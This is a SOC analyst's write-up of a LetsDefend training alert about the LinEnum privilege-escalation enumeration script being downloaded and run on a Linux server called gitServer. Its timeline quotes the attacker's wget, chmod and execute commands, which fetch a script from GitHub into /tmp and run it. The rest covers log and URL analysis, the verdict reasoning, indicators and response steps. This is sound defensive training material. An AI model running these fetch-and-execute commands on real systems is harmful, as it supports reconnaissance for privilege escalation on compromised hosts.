# SOC123 – Enumeration Tool Detected

**Platform:** LetsDefend | **Severity:** Medium | **Classification:** True Positive | **Date:** February 13, 2021
**Host:** `172.16.20.4` (gitServer) | **User:** `Jack`

## Summary

gitServer downloaded **LinEnum**, a Linux privilege-escalation enumeration script, from GitHub. The script was renamed to a random filename in `/tmp`, made executable, and run. Eight days later, the same server was hit by an LFI attempt and a working web shell. See the related investigation: [SOC129 – Successful Local File Inclusion](SOC129-Local-File-Inclusion-Web-Shell-Investigation.md).



## The Attack

**LinEnum** scans a Linux system for ways to gain root access, such as misconfigured permissions, stored credentials, and vulnerable services. Penetration testers use it, and so do attackers immediately after gaining a foothold on a server.

## Timeline

| Time (endpoint) | Event |
| --- | --- |
| 16:47 | `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o /tmp/ah22idah.sh` |
| 16:48 | `clear` |
| 16:49 | `chmod +x /tmp/ah22idah.sh` |
| 16:50 | `./tmp/ah22idah.sh` (script executed) |

*Log Management shows the download at 08:46:11, consistent with the 8-hour offset seen in SOC129.

## Investigation

### 1. Log Analysis

The proxy logged an allowed HTTPS connection from `172.16.20.4:44221` to `185.199.109.133:443` (GitHub) for the LinEnum URL. An internal device reached the URL, so the playbook answer is **Accessed**.

[SCREENSHOT: Log Management entry for the LinEnum download]

### 2. URL Analysis

VirusTotal flagged the URL 5/92 (ESET, Fortinet, CTX AI, Lionic, SafeToOpen). The low score is expected for an open-source tool hosted on GitHub; the vendors that flag it identify it as a hacking tool. GitHub itself is legitimate infrastructure, so the content and context make this malicious, not the host.

[SCREENSHOT: VirusTotal result for the LinEnum URL]

### 3. Endpoint Analysis

gitServer's terminal history confirms the script was renamed, made executable, and run, not just downloaded.

[SCREENSHOT: Endpoint Security, gitServer Terminal History, 2021-02-13 rows]

### 4. Verdict Reasoning

| Clue | Meaning |
| --- | --- |
| Renamed to `/tmp/ah22idah.sh` | A disguised filename; legitimate testers have no reason to hide the tool |
| Saved in `/tmp` | A world-writable folder commonly used to drop tools |
| `clear` after the download | Possible attempt to hide terminal activity |
| User `Jack`, not `gitUser` | Not the server's primary account |
| No pentest indicators | No testing hostname, username, or user agent, unlike SOC127 |
| Later compromise of the same host | Web shell activity on 2021-02-22 (SOC129) |

## Artifacts

| Type | Indicator |
| --- | --- |
| URL | `https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh` |
| Dropped File | `/tmp/ah22idah.sh` |

## Response and Recommendations

gitServer was contained during the SOC129 investigation. Next steps: verify whether `Jack` is an authorized account and reset its credentials, remove `/tmp/ah22idah.sh`, review the server for privilege-escalation changes and persistence, and investigate how `Jack` gained access before 2021-02-13.

## Conclusion

**True Positive.** A privilege-escalation enumeration tool was downloaded, disguised, and executed on gitServer with no sign of authorization. Combined with the web shell activity on the same host eight days later, this points to an ongoing compromise of gitServer.

**MITRE ATT&CK:** T1105 (Ingress Tool Transfer), T1059.004 (Unix Shell), T1082 (System Information Discovery)
